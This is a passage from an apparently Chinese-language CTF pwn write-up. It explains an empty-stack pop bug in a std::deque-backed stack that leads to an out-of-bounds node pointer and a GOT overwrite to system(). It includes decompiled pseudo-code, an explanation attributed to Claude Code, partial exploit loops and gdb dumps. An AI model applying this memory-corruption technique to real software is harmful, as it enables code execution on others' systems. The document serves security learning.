</span></span><span class=line><span class=cl><span class=p>|</span> ----------- <span class=p>|</span> -------------- <span class=p>|</span> ------------------------------------------------------------ <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> **<span class=sb>`</span>cur<span class=sb>`</span>**   <span class=p>|</span> **当前光标**   <span class=p>|</span> <span class=sb>`</span>push<span class=sb>`</span> 时往这里写值并++；<span class=sb>`</span>pop<span class=sb>`</span> 时--。它是最高频变化的字段。  <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> **<span class=sb>`</span>first<span class=sb>`</span>** <span class=p>|</span> **当前块起点** <span class=p>|</span> 用来判断 <span class=sb>`</span>pop<span class=sb>`</span> 时是否撞到了当前 Buffer 的“地板”。            <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> **<span class=sb>`</span>last<span class=sb>`</span>**  <span class=p>|</span> **当前块终点** <span class=p>|</span> 用来判断 <span class=sb>`</span>push<span class=sb>`</span> 时是否撞到了当前 Buffer 的“天花板”。         <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> **<span class=sb>`</span>node<span class=sb>`</span>**  <span class=p>|</span> **Map 导航**   <span class=p>|</span> 当撞到天花板或地板时，通过这个二级指针去 <span class=sb>`</span>_M_map<span class=sb>`</span> 找下一个或上一个 Buffer 的地址。 <span class=p>|</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>这就是 <span class=sb>`</span>std::stack<span class=sb>`</span> 在内存层面的真实面目：**一个在多个断断续续的内存块之间跳跃的“光标”。**
</span></span></code></pre></div><p>接下来再给出claude code结合代码的回答，详细解释了<code>pop</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>  让我一步步解释当对空栈执行 pop<span class=o>()</span> 时发生了什么。
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  1. 初始状态：空的 deque
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  当 std::deque 初始化后为空时，内存布局如下：
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  S <span class=o>(</span>0x405320<span class=o>)</span> 的 std_deque 结构:
</span></span><span class=line><span class=cl>  ┌─────────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>  │ +0x00 _M_map        │ 指向堆上分配的 map 数组 <span class=o>(</span>如 0x4172b0<span class=o>)</span> │
</span></span><span class=line><span class=cl>  │ +0x08 _M_map_size   │ map 数组大小 <span class=o>(</span>通常为 8<span class=o>)</span>               │
</span></span><span class=line><span class=cl>  ├─────────────────────┼───────────────────────────────────────┤
</span></span><span class=line><span class=cl>  │ +0x10 start.cur     │ ─┐                                    │
</span></span><span class=line><span class=cl>  │ +0x18 start.first   │  │ start 迭代器                       │
</span></span><span class=line><span class=cl>  │ +0x20 start.last    │  │                                    │
</span></span><span class=line><span class=cl>  │ +0x28 start.node    │ ─┘                                    │
</span></span><span class=line><span class=cl>  ├─────────────────────┼───────────────────────────────────────┤
</span></span><span class=line><span class=cl>  │ +0x30 finish.cur    │ ─┐ 关键！空栈时 <span class=nv>cur</span> <span class=o>==</span> first          │
</span></span><span class=line><span class=cl>  │ +0x38 finish.first  │  │ finish 迭代器                      │
</span></span><span class=line><span class=cl>  │ +0x40 finish.last   │  │                                    │
</span></span><span class=line><span class=cl>  │ +0x48 finish.node   │ ─┘ 指向 map 数组中的某个 node         │
</span></span><span class=line><span class=cl>  └─────────────────────┴───────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  堆上的 map 数组 <span class=o>(</span>假设在 0x4172b0<span class=o>)</span>:
</span></span><span class=line><span class=cl>  ┌──────────┬──────────┬──────────┬──────────┬─────┐
</span></span><span class=line><span class=cl>  │ map<span class=o>[</span>0<span class=o>]</span>   │ map<span class=o>[</span>1<span class=o>]</span>   │ map<span class=o>[</span>2<span class=o>]</span>   │ map<span class=o>[</span>3<span class=o>]</span>   │ ... │
</span></span><span class=line><span class=cl>  │ 0x4172b0 │ 0x4172b8 │ 0x4172c0 │ 0x4172c8 │     │
</span></span><span class=line><span class=cl>  └──────────┴──────────┴──────────┴──────────┴─────┘
</span></span><span class=line><span class=cl>       ↑
</span></span><span class=line><span class=cl>       └── finish.node 可能指向这里 <span class=o>(</span>map 的起始位置<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  空栈的关键特征：finish.cur <span class=o>==</span> finish.first
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  2. 调用链
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  用户输入: <span class=m>2</span>
</span></span><span class=line><span class=cl>      │
</span></span><span class=line><span class=cl>      ▼
</span></span><span class=line><span class=cl>  main<span class=o>()</span> 中的 S.pop<span class=o>()</span>
</span></span><span class=line><span class=cl>      │
</span></span><span class=line><span class=cl>      ▼
</span></span><span class=line><span class=cl>  stack_pop<span class=o>()</span> <span class=o>[</span>0x401696<span class=o>]</span>
</span></span><span class=line><span class=cl>      │  // 直接调用，没有任何检查！
</span></span><span class=line><span class=cl>      ▼
</span></span><span class=line><span class=cl>  deque_pop_back<span class=o>()</span> <span class=o>[</span>0x4018f4<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  3. deque_pop_back<span class=o>()</span> 的逻辑 <span class=o>[</span>0x4018f4<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  void deque_pop_back<span class=o>(</span>std_deque* this<span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>      // 0x401915: cmp rdx, rax  比较 finish.cur 和 finish.first
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=o>(</span>this-&gt;_M_finish.cur <span class=o>==</span> this-&gt;_M_finish.first<span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>          // 空栈时走这个分支！
</span></span><span class=line><span class=cl>          // 0x401964: call deque_M_pop_back_aux_VULN
</span></span><span class=line><span class=cl>          deque_M_pop_back_aux_VULN<span class=o>(</span>this<span class=o>)</span><span class=p>;</span>  // 危险！
</span></span><span class=line><span class=cl>      <span class=o>}</span> <span class=k>else</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>          // 正常情况：cur 向前移动
</span></span><span class=line><span class=cl>          this-&gt;_M_finish.cur -<span class=o>=</span> 1<span class=p>;</span>  // 减 <span class=m>8</span> 字节
</span></span><span class=line><span class=cl>      <span class=o>}</span>
</span></span><span class=line><span class=cl>  <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  问题：当栈为空时，cur <span class=o>==</span> first，代码认为<span class=s2>&#34;当前 buffer 已经用完，需要切换到前一个 buffer&#34;</span>，但实际上根本没有前一个 buffer！
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  4. deque_M_pop_back_aux_VULN<span class=o>()</span> 的危险操作 <span class=o>[</span>0x401e4c<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  这是漏洞的核心：
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  void deque_M_pop_back_aux_VULN<span class=o>(</span>std_deque* this<span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>      // 步骤1: 释放当前 buffer
</span></span><span class=line><span class=cl>      // 0x401e6f: call deque_M_deallocate_node
</span></span><span class=line><span class=cl>      _M_deallocate_node<span class=o>(</span>this-&gt;_M_finish.first<span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      // 步骤2: 计算新的 node 指针 —— 漏洞在这里！
</span></span><span class=line><span class=cl>      // 0x401e80: mov rdx, <span class=o>[</span>rdx+48h<span class=o>]</span>  <span class=p>;</span> 读取 finish.node
</span></span><span class=line><span class=cl>      // 0x401e84: sub rdx, <span class=m>8</span>          <span class=p>;</span> node 指针减 <span class=m>8</span>
</span></span><span class=line><span class=cl>      unsigned long** <span class=nv>new_node</span> <span class=o>=</span> this-&gt;_M_finish.node - 1<span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      // 步骤3: 用越界的 new_node 设置迭代器
</span></span><span class=line><span class=cl>      // 0x401e8e: call deque_iterator_M_set_node
</span></span><span class=line><span class=cl>      _M_set_node<span class=o>(</span><span class=p>&amp;</span>this-&gt;_M_finish, new_node<span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      // 步骤4: 设置 cur
</span></span><span class=line><span class=cl>      // 0x401ea3: mov <span class=o>[</span>rax+30h<span class=o>]</span>, rdx
</span></span><span class=line><span class=cl>      this-&gt;_M_finish.cur <span class=o>=</span> this-&gt;_M_finish.last - 1<span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  关键漏洞：finish.node - <span class=m>1</span> 会越界！
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  之前:
</span></span><span class=line><span class=cl>  finish.node ──────► map<span class=o>[</span>0<span class=o>]</span> <span class=o>(</span>0x4172b0<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  之后:
</span></span><span class=line><span class=cl>  <span class=nv>new_node</span> <span class=o>=</span> finish.node - <span class=nv>1</span>
</span></span><span class=line><span class=cl>           <span class=o>=</span> 0x4172b0 - <span class=nv>8</span>
</span></span><span class=line><span class=cl>           <span class=o>=</span> 0x4172a8  ◄─── 越界！指向 map 数组之前的内存！
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  5. _M_set_node<span class=o>()</span> 从越界地址读取 <span class=o>[</span>0x4020ac<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  void _M_set_node<span class=o>(</span>_Deque_iterator* this, unsigned long** new_node<span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>      // 0x4020c9: mov <span class=o>[</span>rax+18h<span class=o>]</span>, rdx
</span></span><span class=line><span class=cl>      this-&gt;node <span class=o>=</span> new_node<span class=p>;</span>           // 保存越界的 node 指针
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      // 0x4020d1: mov rdx, <span class=o>[</span>rax<span class=o>]</span>      <span class=p>;</span> 从 new_node 读取！
</span></span><span class=line><span class=cl>      // 0x4020d8: mov <span class=o>[</span>rax+8<span class=o>]</span>, rdx
</span></span><span class=line><span class=cl>      this-&gt;first <span class=o>=</span> *new_node<span class=p>;</span>         // 危险！从越界地址读取值作为 buffer 地址
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      // 0x4020f5: mov <span class=o>[</span>rax+10h<span class=o>]</span>, rdx
</span></span><span class=line><span class=cl>      this-&gt;last <span class=o>=</span> this-&gt;first + 64<span class=p>;</span>   // buffer 大小 <span class=m>64</span> 个元素 <span class=o>(</span><span class=m>512</span> 字节<span class=o>)</span>
</span></span><span class=line><span class=cl>  <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  这里发生了什么：
</span></span><span class=line><span class=cl>  *new_node <span class=o>=</span> *<span class=o>(</span>0x4172a8<span class=o>)</span>  // 读取越界地址的内容
</span></span><span class=line><span class=cl>                           // 这个值会被当作新的 buffer 地址！
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  6. 内存越界的具体情况
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  假设 map 数组分配在堆上，其前面可能是：
</span></span><span class=line><span class=cl>  - 堆的元数据
</span></span><span class=line><span class=cl>  - 之前分配的对象
</span></span><span class=line><span class=cl>  - 或者其他可预测的数据
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  内存布局示例:
</span></span><span class=line><span class=cl>  ┌─────────────────┐
</span></span><span class=line><span class=cl>  │ ... 其他数据 ... │ 0x417298
</span></span><span class=line><span class=cl>  ├─────────────────┤
</span></span><span class=line><span class=cl>  │ 某个 <span class=m>8</span> 字节值   │ 0x4172a0  ◄── new_node 可能指向这里
</span></span><span class=line><span class=cl>  ├─────────────────┤
</span></span><span class=line><span class=cl>  │ 堆 chunk 头     │ 0x4172a8  ◄── 或者这里
</span></span><span class=line><span class=cl>  ├─────────────────┤
</span></span><span class=line><span class=cl>  │ map<span class=o>[</span>0<span class=o>]</span>          │ 0x4172b0  ◄── 原始 finish.node
</span></span><span class=line><span class=cl>  │ map<span class=o>[</span>1<span class=o>]</span>          │ 0x4172b8
</span></span><span class=line><span class=cl>  │ ...             │
</span></span><span class=line><span class=cl>  └─────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  7. 利用：控制 finish.cur
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  经过上述操作后：
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  finish.first <span class=o>=</span> *new_node <span class=o>=</span> 从越界地址读取的值
</span></span><span class=line><span class=cl>  finish.last  <span class=o>=</span> finish.first + <span class=m>512</span>
</span></span><span class=line><span class=cl>  finish.cur   <span class=o>=</span> finish.last - <span class=m>8</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  如果攻击者能控制越界地址处的值（比如通过 name 字符串或堆喷射），就能控制 finish.cur！
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  8. 后续 push<span class=o>()</span> 实现任意写
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  当执行 push<span class=o>(</span>value<span class=o>)</span> 时：
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  void deque_push_back<span class=o>(</span>std_deque* this, unsigned long* value<span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>      // 0x4018bf: mov <span class=o>[</span>rbx<span class=o>]</span>, rax
</span></span><span class=line><span class=cl>      *this-&gt;_M_finish.cur <span class=o>=</span> *value<span class=p>;</span>  // 写入 finish.cur 指向的地址！
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      // 0x4018d4: mov <span class=o>[</span>rax+30h<span class=o>]</span>, rdx
</span></span><span class=line><span class=cl>      this-&gt;_M_finish.cur +<span class=o>=</span> 1<span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  如果 finish.cur 被控制为 GOT 表地址：
</span></span><span class=line><span class=cl>  finish.cur <span class=o>=</span> 0x405028  <span class=o>(</span>operator delete 的 GOT 条目<span class=o>)</span>
</span></span><span class=line><span class=cl>  push<span class=o>(</span>system_addr<span class=o>)</span>
</span></span><span class=line><span class=cl>      ↓
</span></span><span class=line><span class=cl>  *0x405028 <span class=o>=</span> system_addr  // GOT 表被覆写！
</span></span></code></pre></div><p>再来一份<code>push</code>代码详解释</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>  // deque_push_back <span class=o>[</span>0x401832<span class=o>]</span>
</span></span><span class=line><span class=cl>  // 参数: <span class=nv>rdi</span> <span class=o>=</span> deque 指针, <span class=nv>rsi</span> <span class=o>=</span> 要 push 的值的指针
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  void deque_push_back<span class=o>(</span>std_deque* this, size_t* value<span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      // ═══════════════════════════════════════════════════════════════
</span></span><span class=line><span class=cl>      // 步骤 1: 检查当前 buffer 是否还有空间
</span></span><span class=line><span class=cl>      // ═══════════════════════════════════════════════════════════════
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      // 0x40184b: mov rdx, <span class=o>[</span>rax+30h<span class=o>]</span>    <span class=p>;</span> <span class=nv>rdx</span> <span class=o>=</span> finish.cur
</span></span><span class=line><span class=cl>      // 0x401853: mov rax, <span class=o>[</span>rax+40h<span class=o>]</span>    <span class=p>;</span> <span class=nv>rax</span> <span class=o>=</span> finish.last
</span></span><span class=line><span class=cl>      // 0x401857: sub rax, <span class=m>8</span>            <span class=p>;</span> <span class=nv>rax</span> <span class=o>=</span> finish.last - <span class=m>8</span>
</span></span><span class=line><span class=cl>      // 0x40185b: cmp rdx, rax          <span class=p>;</span> 比较 finish.cur 和 finish.last - <span class=m>8</span>
</span></span><span class=line><span class=cl>      // 0x40185e: jz loc_4018DA         <span class=p>;</span> 如果相等，buffer 满了，跳转到 aux 函数
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=o>(</span>this-&gt;_M_finish.cur <span class=o>==</span> this-&gt;_M_finish.last - 1<span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>          // Buffer 已满，需要分配新的 buffer
</span></span><span class=line><span class=cl>          _M_push_back_aux<span class=o>(</span>this, value<span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      // ═══════════════════════════════════════════════════════════════
</span></span><span class=line><span class=cl>      // 步骤 2: 正常情况 - 直接写入 finish.cur 指向的位置
</span></span><span class=line><span class=cl>      // ═══════════════════════════════════════════════════════════════
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      // 0x401864: mov rax, <span class=o>[</span>rax+30h<span class=o>]</span>    <span class=p>;</span> <span class=nv>rax</span> <span class=o>=</span> finish.cur <span class=o>(</span>写入目标地址<span class=o>)</span>
</span></span><span class=line><span class=cl>      // 0x4018a8: call _ZnwmPv          <span class=p>;</span> placement new <span class=o>(</span>实际上就是返回 finish.cur<span class=o>)</span>
</span></span><span class=line><span class=cl>      // 0x4018bc: mov rax, <span class=o>[</span>rax<span class=o>]</span>        <span class=p>;</span> <span class=nv>rax</span> <span class=o>=</span> *value <span class=o>(</span>要写入的值<span class=o>)</span>
</span></span><span class=line><span class=cl>      // 0x4018bf: mov <span class=o>[</span>rbx<span class=o>]</span>, rax        <span class=p>;</span> *finish.cur <span class=o>=</span> value  ← 关键写入操作!
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      *this-&gt;_M_finish.cur <span class=o>=</span> *value<span class=p>;</span>  // 将值写入 finish.cur 指向的地址
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      // ═══════════════════════════════════════════════════════════════
</span></span><span class=line><span class=cl>      // 步骤 3: 更新 finish.cur 指针
</span></span><span class=line><span class=cl>      // ═══════════════════════════════════════════════════════════════
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      // 0x4018c8: mov rax, <span class=o>[</span>rax+30h<span class=o>]</span>    <span class=p>;</span> <span class=nv>rax</span> <span class=o>=</span> finish.cur
</span></span><span class=line><span class=cl>      // 0x4018cc: lea rdx, <span class=o>[</span>rax+8<span class=o>]</span>      <span class=p>;</span> <span class=nv>rdx</span> <span class=o>=</span> finish.cur + <span class=m>8</span>
</span></span><span class=line><span class=cl>      // 0x4018d4: mov <span class=o>[</span>rax+30h<span class=o>]</span>, rdx    <span class=p>;</span> finish.cur <span class=o>=</span> finish.cur + <span class=m>8</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      this-&gt;_M_finish.cur +<span class=o>=</span> 1<span class=p>;</span>  // 移动到下一个位置 <span class=o>(</span>+8 bytes<span class=o>)</span>
</span></span><span class=line><span class=cl>  <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  5. Push 操作的图示
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  执行 S.push<span class=o>(</span>0xCAFEBABE<span class=o>)</span> 前:
</span></span><span class=line><span class=cl>  ═══════════════════════════════════════════════════════════════════
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  finish.cur <span class=o>=</span> 0x29837308
</span></span><span class=line><span class=cl>               │
</span></span><span class=line><span class=cl>               ▼
</span></span><span class=line><span class=cl>  ┌────────────┬────────────┬────────────┬────────────┐
</span></span><span class=line><span class=cl>  │ 0xdeadbeef │ 0x00000000 │ 0x00000000 │    ...     │  S.buffer
</span></span><span class=line><span class=cl>  └────────────┴────────────┴────────────┴────────────┘
</span></span><span class=line><span class=cl>   0x29837300   0x29837308   0x29837310
</span></span><span class=line><span class=cl>        ▲
</span></span><span class=line><span class=cl>        │
</span></span><span class=line><span class=cl>   finish.first
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  执行 S.push<span class=o>(</span>0xCAFEBABE<span class=o>)</span> 后:
</span></span><span class=line><span class=cl>  ═══════════════════════════════════════════════════════════════════
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                            finish.cur <span class=o>=</span> 0x29837310 <span class=o>(</span>已更新<span class=o>)</span>
</span></span><span class=line><span class=cl>                                         │
</span></span><span class=line><span class=cl>                                         ▼
</span></span><span class=line><span class=cl>  ┌────────────┬────────────┬────────────┬────────────┐
</span></span><span class=line><span class=cl>  │ 0xdeadbeef │ 0xCAFEBABE │ 0x00000000 │    ...     │  S.buffer
</span></span><span class=line><span class=cl>  └────────────┴────────────┴────────────┴────────────┘
</span></span><span class=line><span class=cl>   0x29837300   0x29837308   0x29837310
</span></span><span class=line><span class=cl>        ▲            ▲
</span></span><span class=line><span class=cl>        │            │
</span></span><span class=line><span class=cl>   finish.first   写入位置
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  6. 漏洞利用时的 Push
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  当 finish.cur 被控制为 GOT 表地址时：
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  假设通过空栈 pop 漏洞，finish.cur 被设置为 0x405028 <span class=o>(</span>GOT 表<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  执行 S.push<span class=o>(</span>system_addr<span class=o>)</span>:
</span></span><span class=line><span class=cl>  ═══════════════════════════════════════════════════════════════════
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  finish.cur <span class=o>=</span> 0x405028 <span class=o>(</span>被控制的地址<span class=o>)</span>
</span></span><span class=line><span class=cl>               │
</span></span><span class=line><span class=cl>               ▼
</span></span><span class=line><span class=cl>  ┌────────────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>  │ GOT 表                                                          │
</span></span><span class=line><span class=cl>  │ ...                                                             │
</span></span><span class=line><span class=cl>  │ 0x405028: <span class=o>[</span>operator delete<span class=o>]</span> <span class=o>=</span> 0x7ffff7xxxxxx <span class=o>(</span>原始 libc 地址<span class=o>)</span>   │
</span></span><span class=line><span class=cl>  │ ...                                                             │
</span></span><span class=line><span class=cl>  └────────────────────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  执行 *finish.cur <span class=o>=</span> system_addr 后:
</span></span><span class=line><span class=cl>  ═══════════════════════════════════════════════════════════════════
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  ┌────────────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>  │ GOT 表                                                          │
</span></span><span class=line><span class=cl>  │ ...                                                             │
</span></span><span class=line><span class=cl>  │ 0x405028: <span class=o>[</span>operator delete<span class=o>]</span> <span class=o>=</span> system_addr  ← 被覆写!            │
</span></span><span class=line><span class=cl>  │ ...                                                             │
</span></span><span class=line><span class=cl>  └────────────────────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  之后任何调用 operator delete 的操作都会执行 system<span class=o>()</span>!
</span></span></code></pre></div><p><code>push</code>操作不用理解很深刻，在这道题只需要知道<code>push</code>的时候，<code>buffer</code>不够了是<strong>先分配再调整指针，写值</strong>即可，还有就是<strong>map不够了也是会重新分配一片更大的内存</strong></p><p>如果最开始只<code>pop</code>是不行的，虽然可以越界</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>64</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>T_pop</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>64</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>T_pop</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>64</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>T_pop</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>pause</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>0x405380 &lt;T&gt;:    0x0000000032a1e510(**_M_map)    0x0000000000000008
</span></span></span><span class=line><span class=cl><span class=s2>0x405390 &lt;T+16&gt;:    0x0000000032a1e560    0x0000000032a1e560
</span></span></span><span class=line><span class=cl><span class=s2>0x4053a0 &lt;T+32&gt;:    0x0000000032a1e760    0x0000000032a1e528
</span></span></span><span class=line><span class=cl><span class=s2>0x4053b0 &lt;T+48&gt;:    0x0000000000000000    0x0000000000000000
</span></span></span><span class=line><span class=cl><span class=s2>0x4053c0 &lt;T+64&gt;:    0x0000000000000200    0x0000000032a1e510(_M_finish-&gt;node)
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=c1>#THE NEXT T_pop() WILL BACK OVERFLOW _M_map</span>
</span></span><span class=line><span class=cl><span class=n>T_pop</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>0x405380 &lt;T&gt;:    0x0000000032a1e510(**_M_map)    0x0000000000000008
</span></span></span><span class=line><span class=cl><span class=s2>0x405390 &lt;T+16&gt;:    0x0000000032a1e560    0x0000000032a1e560
</span></span></span><span class=line><span class=cl><span class=s2>0x4053a0 &lt;T+32&gt;:    0x0000000032a1e760    0x0000000032a1e528
</span></span></span><span class=line><span class=cl><span class=s2>0x4053b0 &lt;T+48&gt;:    0x0000000000000249    0x0000000000000051
</span></span></span><span class=line><span class=cl><span class=s2>0x4053c0 &lt;T+64&gt;:    0x0000000000000251    0x0000000032a1e508(_M_finish-&gt;node)
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span></code></pre></div><p>但是再越界就会触发<code>free heap head</code>，</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>64</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>T_pop</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>64</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>T_pop</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>64</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>T_pop</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>0x405380 &lt;T&gt;:    0x0000000032a1e510(**_M_map)    0x0000000000000008
</span></span></span><span class=line><span class=cl><span class=s2>0x405390 &lt;T+16&gt;:    0x0000000032a1e560    0x0000000032a1e560
</span></span></span><span class=line><span class=cl><span class=s2>0x4053a0 &lt;T+32&gt;:    0x0000000032a1e760    0x0000000032a1e528
</span></span></span><span class=line><span class=cl><span class=s2>0x4053b0 &lt;T+48&gt;:    0x0000000000000000    0x0000000000000000
</span></span></span><span class=line><span class=cl><span class=s2>0x4053c0 &lt;T+64&gt;:    0x0000000000000200    0x0000000032a1e510(_M_finish.node)
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=c1>#T_pop()</span>
</span></span><span class=line><span class=cl><span class=c1>#THE NEXT T_pop() WILL BACK OVERFLOW _M_map</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>0x405380 &lt;T&gt;:    0x0000000032a1e510(**_M_map)    0x0000000000000008
</span></span></span><span class=line><span class=cl><span class=s2>0x405390 &lt;T+16&gt;:    0x0000000032a1e560    0x0000000032a1e560
</span></span></span><span class=line><span class=cl><span class=s2>0x4053a0 &lt;T+32&gt;:    0x0000000032a1e760    0x0000000032a1e528
</span></span></span><span class=line><span class=cl><span class=s2>0x4053b0 &lt;T+48&gt;:    0x0000000000000249    0x0000000000000051
</span></span></span><span class=line><span class=cl><span class=s2>0x4053c0 &lt;T+64&gt;:    0x0000000000000251    0x0000000032a1e508(_M_finish.node)
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=c1>#BUT THE HEAP_SIZE IS NO USE, SO KEEP GOING</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>64</span><span class=p>):</span>
